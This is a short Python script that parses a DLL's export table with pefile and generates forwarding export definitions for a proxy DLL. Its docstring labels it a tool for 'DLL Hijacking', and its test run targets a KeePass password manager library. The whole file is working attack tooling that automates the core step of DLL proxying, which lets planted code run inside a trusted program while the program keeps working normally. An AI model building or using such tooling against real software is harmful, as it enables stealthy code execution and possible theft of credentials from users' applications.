"""Generate DLL Proxy pragmas

Raises:
    Exception: Invalid File Type (Not a DLL)

Returns:
    str: DLL Pragmas in C format
"""

import pefile, asyncio

async def generate_proxies(dll_file, dll_file_name):
    """Generate Pragma Linkers for DLL Hijacking

    Args:
        dll_file (Path): DLL File to hijack
        dll_file_name (str): DLL Name to populate exports

    Raises:
        Exception: File is not a DLL

    Returns:
        str: Linker Pragmas
    """
    if pefile.PE(dll_file).is_dll:
        dll_pe = pefile.PE(dll_file)
    else:
        raise Exception("[-] Invalid Selection: Target file is not a DLL.")

    if hasattr(dll_pe, 'DIRECTORY_ENTRY_EXPORT') and dll_pe.DIRECTORY_ENTRY_EXPORT:
        lines = ["EXPORTS"]
        for exports in dll_pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if exports.name:
                #  name=target.name @ordinal
                lines.append(f"{exports.name.decode()}={dll_file_name}.{exports.name.decode()} @{exports.ordinal}")
            else:
                lines.append(f"@{exports.ordinal}={dll_file_name}.@{exports.ordinal} NONAME")
        return "\n".join(lines)

# Test to see if the function generates anything
if __name__ == "__main__":
    pragmas = asyncio.run(generate_proxies(r"F:\Program Files\KeePass Password Safe 2\KeePassLibN.a64.dll", "KeePassLibN.a64.dll"))
    print(pragmas)